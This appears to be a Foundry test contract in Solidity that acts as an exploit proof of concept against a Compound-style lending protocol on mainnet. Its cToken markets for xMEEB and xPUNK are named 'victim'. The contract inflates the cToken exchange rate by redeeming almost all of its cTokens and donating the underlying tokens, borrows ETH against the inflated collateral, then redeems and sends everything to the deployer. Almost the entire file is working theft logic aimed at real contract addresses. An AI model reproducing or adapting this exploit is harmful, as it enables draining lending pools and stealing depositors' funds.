// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./ICerc20.sol";
import "./IERC20.sol";
import "./IUnitroller.sol";

interface INFTI is IERC20{
    function mint(uint256 amount) external;
    function burn(uint256 amount) external;
}

contract Child1 is Test {

    address deployerContract;
    // address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; //Main
    address public NFTI = 0x525eF76138Bf76118d786DbedeaE5F87aaBf4a81;
    address public xMEEB = 0x11Df658567e615f69D23289BE8A27a9C260cE297;
    address public xPUNK = 0x08765C76C758Da951DC73D3a8863B34752Dd76FB;
    address public kERC20_1 = 0x8486B523a32e9D0d021078Fe68a3b98fC765FbaB;//Main xMeeb
    address public kERC20_2 = 0xfBA58fDDB88203E1D32D0F3E6DbFD9d8b505EC18;//Main xPunk
    address public UNITROLLER = 0xB70FB69a522ed8D4613C4C720F91F93a836EE2f5;//Main

    CErc20Interface victim2 = CErc20Interface(kERC20_2);
    CErc20Interface victim1 = CErc20Interface(kERC20_1);

    IERC20 xpunk = IERC20(xPUNK);
    IERC20 xmeeb = IERC20(xMEEB);


    ComptrollerInterface unitroller = ComptrollerInterface(UNITROLLER);
    INFTI nfti = INFTI(NFTI);
    constructor(){
        deployerContract = msg.sender;
        transferToDrop();
    }

    function transferToDrop() internal {

        address[] memory cTokens = new address[](2);
        cTokens[0] = kERC20_1;  
        cTokens[1] = kERC20_2;
        uint[] memory errors = unitroller.enterMarkets(cTokens);

        uint256 xmAmount = balanceOfThis(xMEEB);
        uint256 xpAmount = balanceOfThis(xPUNK);

        xmeeb.approve(kERC20_1, xmAmount);    
        xpunk.approve(kERC20_2, xpAmount);
        victim1.mint(xmAmount);
        victim2.mint(xpAmount);

        {        
            // console.log(errors[0]);            
            victim1.redeem(victim1.balanceOf(address(this))-2);
            victim2.redeem(victim2.balanceOf(address(this))-2);
       
            uint256 transferAmountXm = balanceOfThis(xMEEB);
            uint256 transferAmountXp = balanceOfThis(xPUNK);
            xmeeb.transfer(kERC20_1, transferAmountXm);
            xpunk.transfer(kERC20_2, transferAmountXp);
            
            // console.log(victim1.exchangeRateStored());       
            (uint a, uint b, uint c) = unitroller.getAccountLiquidity(address(this));
            console.log("a :",a);
            console.log("b :",b);
            console.log("c :",c);
         
            CErc20Interface(0xD72929e284E8bc2f7458A6302bE961B91bccB339).borrow(80*10**17);//cETH
            // CErc20Interface(0xD72929e284E8bc2f7458A6302bE961B91bccB339).borrow(23*10**17);//cETH
            console.log("Before :",victim1.balanceOf(address(this)));

            victim1.redeemUnderlying(transferAmountXm);
            victim2.redeemUnderlying(transferAmountXp);

            //Test
            console.log("xMEEB after balance :",balanceOfThis(xMEEB));
            console.log("xPUNK after balance :",balanceOfThis(xPUNK));
            console.log("After :",victim1.balanceOf(address(this)));
            
        }
        xmeeb.transfer(deployerContract, balanceOfThis(xMEEB));
        xpunk.transfer(deployerContract, balanceOfThis(xPUNK));
        uint256 bal = payable(address(this)).balance;
        payable(deployerContract).transfer(bal);

    }

    function balanceOfThis(address _erc20TokenAddress) internal view returns (uint256 bal) {
        IERC20 ERC20Token;    
        ERC20Token = IERC20(_erc20TokenAddress);
   
        bal = ERC20Token.balanceOf(address(this));
        // console.log("Executor Token balance", bal);
        return bal;   

    }
}